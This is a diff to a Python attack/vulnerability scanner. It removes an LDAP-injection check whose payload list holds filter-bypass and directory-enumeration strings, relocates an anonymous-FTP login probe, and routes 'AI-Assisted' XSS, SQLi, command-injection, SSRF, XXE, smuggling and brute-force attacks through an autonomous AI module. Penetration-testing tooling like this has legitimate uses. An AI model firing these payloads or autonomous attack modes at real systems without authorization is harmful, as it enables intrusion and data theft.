@@ -4385,80 +4385,27 @@ async def check_http_smuggling(target, output, tech, report, session_cookies=Non
     output.print("  [INFO] HTTP Smuggling scan completed.")
 
 # --- [NEW] LDAP Injection ---
-async def check_ldap_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
-    output.print(f"\n[+] Starting Hybrid LDAP Injection Scan...")
 
-    ldap_probes = ["*", ")", "(", ")(", "*)(", "admin*"]
-    
-    ldap_payloads = [
-        # Basic Probes & Wildcards
-        "*", "(", ")", "&", "|", "=", ">=", "<=", "~=", ")(", "*)(", "()",
-        # Filter Bypass & Logic Injection
-        "*)(cn=*)", ")(uid=*)", "*))%00", "(|(cn=*)(sn=*))", "(&(cn=*)(sn=*))",
-        "admin*", "*admin", "*admin*",
-        # Information Disclosure
-        "(objectClass=*)", "(uid=*)", "(cn=*)", "(sn=*)", "(mail=*)", "(telephoneNumber=*)",
-        # Error-Based
-        "a'b", "a''b", "'", "')(", ")(", "\\", "//", "/!", "*\\",
-        # Blind / Boolean Based
-        "(uid=admin)", "(uid=admin)(uid=*)", "(uid=nonexistentuser)",
-        "(&(objectClass=user)(uid=admin))", "(&(objectClass=user)(uid=nonexistent))",
-        # Massive Expansion
-        *[f"({attr}=*)" for attr in ['userPassword', 'sAMAccountName', 'memberOf', 'description', 'homeDirectory', 'loginShell', 'objectGUID', 'userAccountControl', 'pwdLastSet', 'lastLogon', 'mail', 'proxyAddresses']],
-        *[f"*{char}" for char in "()&|=!<>~"],
-        *[f"*)(|({attr1}=*)({attr2}=*))" for attr1 in ['cn', 'uid', 'mail'] for attr2 in ['sn', 'givenName', 'displayName']],
-        *[f"(&(cn=*{val}*)(sn=*{val}*))" for val in ['admin', 'test', 'guest', 'user']],
-        *[f"cn=*{char}*" for char in string.ascii_lowercase],
-        *[f"sn=*{char}*" for char in string.ascii_lowercase],
-        *[f"mail=*{char}*@*" for char in string.ascii_lowercase],
-    ]
 
-    ldap_errors = [
-        "ldap", "invalid filter", "illegal", "protocol error", "ldap exception",
-        "javax.naming.NameNotFoundException", "object does not exist",
-        "javax.naming.directory.InvalidSearchFilterException", "unrecognized attribute",
-        "ldap_search()", "ldap entry", "search filter is invalid"
-    ]
+async def _ftp_anonymous_login(target, port, output_dir, report):
+    """Async helper to check for anonymous FTP login."""
+    output.print(f"    [*] Attempting anonymous FTP login on {target}:{port}")
+    try:
+        reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
+        writer.write(b"USER anonymous\r\n")
+        await writer.drain()
+        await reader.read(1024)
+        writer.write(b"PASS anonymous\r\n")
+        await writer.drain()
+        res_pass = await reader.read(1024)
+        if b"230" in res_pass:
+            output.print(f"      [HIGH] Anonymous FTP login successful on {target}:{port}.")
+            report.add_finding("Anonymous FTP Access", "High", f"{target}:{port}", "FTP Login", "anonymous:anonymous", "Anonymous FTP access is enabled, potentially exposing files.", "Disable anonymous FTP access if not required.", f"Response: {res_pass.decode(errors='ignore')}")
+        writer.close()
+        await writer.wait_closed()
+    except Exception as e:
+        output.print(f"      [ERROR] FTP check on {target}:{port} failed: {e}")
 
-    async def test_single_ldap_payload(point, payload, output, session_cookies):
-        """
-        Sends a single LDAP payload and checks for LDAP injection indicators.
-        """
-        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + payload, point['form_data'], point['original_query'])
-        res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
-
-        if res and await res.text():
-            response_text = await res.text()
-            # Check for common LDAP error messages or successful LDAP responses
-            ldap_success_indicators = ["ldap_search", "ldap entry", "objectClass", "dn:"]
-            ldap_error_indicators = ["ldap error", "invalid filter", "protocol error", "javax.naming.NameNotFoundException", "unrecognized attribute"]
-
-            if any(indicator in response_text.lower() for indicator in ldap_success_indicators):
-                output.print(f"    [LDAP] Potential LDAP Injection (Success Indicator) with payload: {payload}")
-                return True
-            if any(indicator in response_text.lower() for indicator in ldap_error_indicators):
-                output.print(f"    [LDAP] Potential LDAP Injection (Error Indicator) with payload: {payload}")
-                return True
-        return False
-
-        async def _ftp_anonymous_login(target, port, output_dir, report):
-            """Async helper to check for anonymous FTP login."""
-            output.print(f"    [*] Attempting anonymous FTP login on {target}:{port}")
-            try:
-                reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port), timeout=5)
-                writer.write(b"USER anonymous\r\n")
-                await writer.drain()
-                await reader.read(1024)
-                writer.write(b"PASS anonymous\r\n")
-                await writer.drain()
-                res_pass = await reader.read(1024)
-                if b"230" in res_pass:
-                    output.print(f"      [HIGH] Anonymous FTP login successful on {target}:{port}.")
-                    report.add_finding("Anonymous FTP Access", "High", f"{target}:{port}", "FTP Login", "anonymous:anonymous", "Anonymous FTP access is enabled, potentially exposing files.", "Disable anonymous FTP access if not required.", f"Response: {res_pass.decode(errors='ignore')}")
-                writer.close()
-                await writer.wait_closed()
-            except Exception as e:
-                output.print(f"      [ERROR] FTP check on {target}:{port} failed: {e}")
 async def _smb_anonymous_share(target, port, output_dir, report):
     """Async helper to check for anonymous SMB shares."""
     output.print(f"    [*] Checking for anonymous SMB shares on {target}:{port}")
@@ -7769,7 +7716,7 @@ async def ai_generate_report_summary(report, output_handler):
         output_handler.print(f"[AI ERROR] Failed to generate AI report summary: {e}\nTraceback:\n{error_traceback}")
         return ""
 
-async def run_attack_sequence(target, session_cookies, output_handler, ai_enabled=False, scan_type='full'): # Added scan_type
+async def run_attack_sequence(target, session_cookies, output_handler, config_file, ai_enabled=False, scan_type='full'): # Added scan_type and config_file
     """Orchestrates the entire attack sequence, with an option for AI assistance."""
     if not _is_valid_url(target):
         output_handler.print(f"\n[ERROR] Invalid target URL provided: {target}. Please provide a full URL starting with http:// or https://")
@@ -7777,18 +7724,59 @@ async def run_attack_sequence(target, session_cookies, output_handler, ai_enable
     
     report = Report(target)
     tech = {'server': 'Unknown', 'backend': 'Unknown', 'framework': 'Unknown'}
-    
-    if ai_enabled:
-        output_handler.print("\n[AI MODE] AI assistance is enabled for this scan.")
-        # If AI mode is enabled and scan_type is exposed_services, run AI assist for it
-        if scan_type == 'exposed_services':
-            # We need to run scan_exposed_services first to get findings
-            # This is a bit tricky because scan_exposed_services needs nmap_output_file
-            # For now, we'll let run_all_attacks handle the execution and AI assist will be called later if needed.
-            pass # AI assist will be called after run_all_attacks if scan_type is exposed_services
 
-    # run_all_attacks will now return True if the secondary scan was run, False otherwise.
-    secondary_scan_was_run = await run_all_attacks(target, output_handler, tech, report, session_cookies=session_cookies, ai_enabled=ai_enabled, scan_type=scan_type) # Pass scan_type
+    if ai_enabled:
+        output_handler.print(f"\n[AI MODE] AI-Assisted {scan_type.upper()} Scan initiated.")
+        if scan_type == 'full':
+            await full_ai_mode.run_full_ai_mode(target, config_file) # config_file needs to be passed
+        elif scan_type == 'exposed_services':
+            # For exposed_services, we need an nmap_output_file.
+            # This implies a prior Nmap scan. For now, we'll assume it's handled or passed.
+            # A more robust solution would integrate Nmap scanning here if not already done.
+            # For this iteration, we'll call it directly.
+            await full_ai_mode.perform_exposed_services_attack(target, output_handler, tech, report, session_cookies)
+        elif scan_type == 'xss':
+            await full_ai_mode.perform_xss_attack(target, method="GET", output=output_handler, tech=tech, report=report, session_cookies=session_cookies)
+        elif scan_type == 'sqli':
+            await full_ai_mode.perform_sqli_attack(target, method="GET", output=output_handler, tech=tech, report=report, session_cookies=session_cookies)
+        elif scan_type == 'lfi':
+            await full_ai_mode.perform_lfi_rfi_attack(target, method="GET", output=output_handler, tech=tech, report=report, session_cookies=session_cookies)
+        elif scan_type == 'cmdi':
+            # Direct call to the newly integrated perform_cmdi_attack
+            output_handler.print(f"[AI MODE] Launching AI-Assisted Command Injection attack on {target}.")
+            await full_ai_mode.perform_cmdi_attack(target, form_to_test=None, output=output_handler, tech=tech, report=report, session_cookies=session_cookies, ai_enabled=True)
+        elif scan_type == 'rce':
+            output_handler.print("[AI MODE] RCE attack not yet fully integrated with perform_rce_attack. Running classic.")
+            # Placeholder for full_ai_mode.perform_rce_attack
+            await run_all_attacks(target, output_handler, tech, report, session_cookies=session_cookies, ai_enabled=ai_enabled, scan_type=scan_type)
+        elif scan_type == 'ssti':
+            await full_ai_mode.perform_ssti_attack(target, method="GET", output=output_handler, tech=tech, report=report, session_cookies=session_cookies)
+        elif scan_type == 'idor':
+            output_handler.print("[AI MODE] IDOR attack not yet fully integrated with perform_idor_attack. Running classic.")
+            # Placeholder for full_ai_mode.perform_idor_attack
+            await run_all_attacks(target, output_handler, tech, report, session_cookies=session_cookies, ai_enabled=ai_enabled, scan_type=scan_type)
+        elif scan_type == 'ssrf':
+            await full_ai_mode.perform_ssrf_attack(target, method="GET", output=output_handler, tech=tech, report=report, session_cookies=session_cookies)
+        elif scan_type == 'xxe':
+            await full_ai_mode.perform_xxe_attack(target, method="POST", output=output_handler, tech=tech, report=report, session_cookies=session_cookies)
+        elif scan_type == 'http-smuggling':
+            output_handler.print("[AI MODE] HTTP Smuggling attack not yet fully integrated with perform_http_smuggling_attack. Running classic.")
+            # Placeholder for full_ai_mode.perform_http_smuggling_attack
+            await run_all_attacks(target, output_handler, tech, report, session_cookies=session_cookies, ai_enabled=ai_enabled, scan_type=scan_type)
+        elif scan_type == 'brute-force':
+            output_handler.print("[AI MODE] Brute Force attack not yet fully integrated with perform_brute_force_login. Running classic.")
+            # Placeholder for full_ai_mode.perform_brute_force_login
+            await run_all_attacks(target, output_handler, tech, report, session_cookies=session_cookies, ai_enabled=ai_enabled, scan_type=scan_type)
+        
+        # After performing the specific AI-assisted attack, generate the report
+        report_filename = f"report_final_{get_domain(target)}_{time.strftime('%Y%m%d_%H%M%S')}.txt"
+        ai_content = await ai_generate_report_summary(report, output_handler)
+        report.write_to_file(report_filename, append_content=ai_content)
+        output_handler.print(f"\n[SUCCESS] Final comprehensive report generated: {report_filename}")
+        return # Exit after specific AI-assisted attack
+
+    # Original logic for non-AI or full classic scan
+    secondary_scan_was_run = await run_all_attacks(target, output_handler, tech, report, session_cookies=session_cookies, ai_enabled=ai_enabled, scan_type=scan_type)
     
     # Only generate the final, comprehensive report if the secondary scan was executed.
     if secondary_scan_was_run:
@@ -7801,48 +7789,8 @@ async def run_attack_sequence(target, session_cookies, output_handler, ai_enable
         output_handler.print(f"\n[SUCCESS] Final comprehensive report generated: {report_filename}")
     else:
         output_handler.print(f"\n[INFO] Scan finished. Primary report has been saved.")
-
-    # NEW: Call AI assist for exposed services if enabled and scan_type matches
-    if ai_enabled and scan_type == 'exposed_services':
-        # The findings from scan_exposed_services are already in report.findings
-        exposed_services_findings = [f['description'] for f in report.findings if f['vulnerability'] == 'Exposed Service Vulnerability']
-        if exposed_services_findings:
-            await ai_assist_exposed_services(target, output_handler.output_dir, exposed_services_findings)
     
-    # NEW: Call AI assist for all secondary attack modules if enabled and scan_type is 'full'
-    if ai_enabled and scan_type == 'full':
-        output_handler.print(f"\n[AI MODE] AI Assistant analyzing secondary attack findings for {target}...{Style.RESET_ALL}")
-        
-        # Map vulnerability types to their AI assist functions
-        ai_assist_map = {
-            "MongoDB Vulnerability": ai_assist_mongodb,
-            "RTSP Vulnerability": ai_assist_rtsp,
-            "Insecure Deserialization": ai_assist_insecure_deserialization,
-            "GraphQL Injection": ai_assist_graphql_injection,
-            "CORS Misconfiguration": ai_assist_cors,
-            "CRLF Injection": ai_assist_crlf,
-            "Open Redirect": ai_assist_open_redirect,
-            "SSRF Vulnerability": ai_assist_ssrf,
-            "React2Shell Vulnerability": ai_assist_react2shell,
-            "XXE Vulnerability": ai_assist_xxe,
-            "Cross-Site Request Forgery (CSRF)": ai_assist_csrf, # CSRF has multiple types, but we can group
-            "File Inclusion Vulnerability": ai_assist_file_inclusion,
-            "Brute Force Login": ai_assist_brute_force_login,
-        }
 
-        # Group findings by vulnerability type
-        grouped_findings = {}
-        for finding in report.findings:
-            vuln_type = finding['vulnerability']
-            if vuln_type in ai_assist_map:
-                if vuln_type not in grouped_findings:
-                    grouped_findings[vuln_type] = []
-                grouped_findings[vuln_type].append(finding['description'])
-        
-        for vuln_type, findings_list in grouped_findings.items():
-            ai_assist_func = ai_assist_map[vuln_type]
-            await ai_assist_func(target, output_handler.output_dir, findings_list)
-    
 
 def _run_single_attack(args):
     """Helper function to run a single attack; designed to be called by ThreadPoolExecutor."""
@@ -8209,11 +8157,7 @@ if __name__ == '__main__':
         target = input("  [?] Enter target URL/IP for AI Scan: ")
         
         if mode == '3':
-            # --- NEW: Run Full AI Mode first as requested ---
-            print("\n[+] Running Full AI Mode (Autonomous Pentest) as part of AI-Assisted Mode...")
-            full_ai_mode.run_full_ai_mode(target, config_file)
-            print("\n[+] Full AI Mode completed. Proceeding with original AI-Assisted Mode scan selection.")
-            # --- END NEW ---
+
 
             cookies_raw = input("  [?] Enter session cookies if any (e.g., 'key1=val1; key2=val2'): ")
             if cookies_raw:
@@ -8222,26 +8166,40 @@ if __name__ == '__main__':
             print("\n  [?] Select AI-Assisted Scan Type:")
             print("    1: Full Scan (Comprehensive, AI-prioritized)")
             print("    2: Exposed Services Scan (Focus on common service vulnerabilities)")
-            print("    3: XSS Scan")
-            print("    4: SQLi Scan")
-            print("    5: LFI Scan")
-            print("    6: CMDi Scan")
-            print("    7: RCE Scan")
-            print("    8: SSTI Scan")
-            print("    9: BAC Scan (Broken Access Control)")
+            print("    3: Cross-Site Scripting (XSS)")
+            print("    4: SQL Injection (SQLi)")
+            print("    5: Local/Remote File Inclusion (LFI/RFI)")
+            print("    6: Command Injection (CMDi)")
+            print("    7: Remote Code Execution (RCE)")
+            print("    8: Server-Side Template Injection (SSTI)")
+            print("    9: Insecure Direct Object References (IDOR/BAC)")
+            print("    10: Server-Side Request Forgery (SSRF)")
+            print("    11: XML External Entity (XXE)")
+            print("    12: HTTP Smuggling")
+            print("    13: Brute Force (Login)")
             
-            scan_type_choice = input("  Enter your choice (1-9): ")
+            scan_type_choice = input("  Enter your choice (1-13): ")
             
             scan_type_map = {
-                '1': 'full', '2': 'exposed_services', '3': 'xss',
-                '4': 'sqli', '5': 'lfi', '6': 'cmdi', '7': 'rce', '8': 'ssti',
-                '9': 'bac'
+                '1': 'full',
+                '2': 'exposed_services',
+                '3': 'xss',
+                '4': 'sqli',
+                '5': 'lfi',
+                '6': 'cmdi',
+                '7': 'rce',
+                '8': 'ssti',
+                '9': 'idor', # Mapped BAC to IDOR
+                '10': 'ssrf',
+                '11': 'xxe',
+                '12': 'http-smuggling',
+                '13': 'brute-force'
             }
             
             selected_scan_type = scan_type_map.get(scan_type_choice, 'full')
             print(f"  [INFO] Selected AI-Assisted Scan Type: {selected_scan_type.upper()}")
 
-            asyncio.run(run_attack_sequence(target, session_cookies, output_handler, ai_enabled=ai_enabled, scan_type=selected_scan_type))
+            asyncio.run(run_attack_sequence(target, session_cookies, output_handler, config_file, ai_enabled=ai_enabled, scan_type=selected_scan_type))
         
         elif mode == '4':
             # Run the full autonomous AI mode
